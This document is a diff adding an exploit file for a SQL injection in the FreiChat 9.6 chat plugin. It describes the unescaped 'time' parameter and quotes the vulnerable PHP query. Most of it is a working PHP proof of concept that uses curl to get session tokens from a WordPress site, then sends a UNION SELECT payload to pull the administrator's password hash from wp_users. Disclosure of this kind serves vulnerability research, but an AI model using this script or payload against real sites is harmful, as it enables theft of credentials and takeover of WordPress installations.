@@ -1,0 +1,85 @@
+/*
+# Exploit Title: FreiChat 9.6 SQL Injection
+# Date: 27-11-2014
+# Software Link: http://codologic.com/page/freichat-free-php-chat-script-software
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# Category: webapps
+
+1. Description
+  
+$_GET['time'] is not escaped.
+
+File: freichat\server\plugins\chatroom\chatroom.php
+
+$get_mesg = $this->get_messages($_GET['time']);
+public function get_messages($time) {
+
+    $frm_id = $this->frm_id;
+    $result = array();
+
+    if ($time == 0) {
+		//$get_mesg_query = "SELECT DISTINCT * FROM frei_chat WHERE frei_chat.\"to\"=" . $frm_id . "AND time<2 order by time";
+    } else {
+        $get_mesg_query = "SELECT * FROM frei_chat WHERE frei_chat.\"to\"=" . $frm_id . " AND time>" . $time . " AND message_type<>1 order by time ";
+        $result = $this->db->query($get_mesg_query)->fetchAll();
+    }
+
+
+    return $result;
+}
+
+http://security.szurek.pl/freichat-96-sql-injection.html
+
+2. Proof of Concept
+
+Example for WordPress integration (it will give you admin password):
+*/
+
+<?php
+/*
+ * Kacper Szurek
+ * http://security.szurek.pl
+ */
+function hack($url, $cookie, $sql ){
+
+$ckfile = dirname(__FILE__) . $cookie;
+$cookie = fopen($ckfile, 'w') or die("Cannot create cookie file");
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
+curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+
+$content = curl_exec($ch);
+
+if (preg_match('|http://(.*?)/freichat/client/main\.php\?id=([a-zA-Z0-9]+)&xhash=([a-zA-Z0-9]+)|i', $content, $matches)) {
+    curl_setopt($ch, CURLOPT_URL, 'http://'.$matches[1].'/freichat/server/freichat.php?freimode=getmembers&id='.$matches[2].'&xhash='.$matches[3]);
+    $content = curl_exec($ch);
+
+    curl_setopt($ch, CURLOPT_URL, 'http://'.$matches[1].'/freichat/server/freichat.php?freimode=loadchatroom&id='.$matches[2].'&xhash='.$matches[3].'&in_room=1&chatroom_mesg_time=1&custom_mesg=1&time='.urlencode($sql));
+
+    $content = curl_exec($ch);
+
+    if (preg_match('|"room_id":"([^"]+)"|', $content, $output)) {
+        echo "WordPress password user ID=1: ".$output[1];
+    } else {
+        echo "FAIL";
+    }
+}
+
+curl_close( $ch );
+}
+
+// URL to WordPress main URL
+$url = "http://wp/";
+
+// SQL Payload
+$sql = "1 UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, user_pass FROM wp_users WHERE ID=1 -- ";
+
+$cookie = "/cookie.txt";
+
+hack($url, $cookie, $sql);
